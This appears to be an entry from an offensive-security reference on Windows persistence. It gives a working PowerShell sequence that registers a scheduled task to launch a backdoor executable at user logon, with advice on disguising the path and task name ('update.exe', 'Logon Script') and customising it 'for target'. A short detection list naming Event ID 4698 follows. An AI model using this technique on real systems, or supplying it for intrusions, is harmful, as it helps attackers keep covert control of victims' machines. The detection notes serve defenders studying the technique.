---
type: code
language: powershell
verified: true
platforms:
  - Windows
tags:
  - persistence
  - scheduled-task
  - backdoor
validated: true
---

# PowerShell-Create-Scheduled-Task-at-Logon

## Code

```powershell
PS C:\> $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
PS C:\> $T = New-ScheduledTaskTrigger -AtLogOn -User "Rasta"
PS C:\> $P = New-ScheduledTaskPrincipal "Rasta"
PS C:\> $S = New-ScheduledTaskSettingsSet
PS C:\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
PS C:\> Register-ScheduledTask Backdoor -InputObject $D
```

## Description

This multi-line PowerShell script creates and registers a scheduled task that executes a backdoor on user logon, providing session-tied persistence.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| C:\Users\Rasta\AppData\Local\Temp\backdoor.exe | Path to backdoor | %APPDATA%\update.exe |
| "Rasta" | User for trigger/principal | "DOMAIN\User" |
| Backdoor | Task name | "Logon Script" |

## Usage

Run sequentially in elevated PowerShell. Customize user, path, and name for target. Verifies with Get-ScheduledTask; executes on next logon.

## Detection

- PowerShell ScriptBlock logging showing New/Register-ScheduledTask.
- New tasks with logon triggers for non-standard users (Event ID 4698).
- Task actions pointing to user-writable paths.

## Related

- [[procedures/Create-Scheduled-Task-Backdoor-for-Persistence]]
- [[commands/powershell-register-scheduledtask]]
